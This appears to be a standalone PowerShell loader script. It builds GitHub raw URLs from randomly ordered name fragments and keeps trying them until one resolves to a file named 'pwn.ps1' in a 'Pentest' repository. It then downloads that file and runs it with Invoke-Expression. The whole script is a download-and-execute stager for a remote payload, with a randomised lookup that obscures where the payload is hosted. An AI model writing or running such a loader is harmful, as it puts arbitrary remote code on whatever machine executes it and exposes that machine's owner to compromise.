Function testUrl($url){
  $web=[System.Net.WebRequest]::Create($url)
  try {
    $res=$web.GetResponse()
  }catch{}
  $stat=$res.StatusCode
  If($stat-eq200){
    write-host("OKOKOK")
    return $res.GetResponseStream()
  }Else{
    Write-host("MORT")
    return $false
  }
}
Function getUrl($stream){
  $sr=New-Object System.IO.StreamReader $stream
  $res=$sr.ReadToEnd()
  Invoke-Expression($res)
}
function setUrl{
  $sub="tf","air","ane"
  for($i=0;$i-lt$sub.Length;$i++){
    $url+=$sub[(Get-Random -maximum $sub.Length)]
  }
  return ("https://raw.githubusercontent.com/"+$url+"/Pentest/master/Vectors/pwn.ps1")
}
Do{
  $url=(setUrl)
  write-host $url
}while(($s=testUrl($url))-eq$false) #until
(getUrl($s))
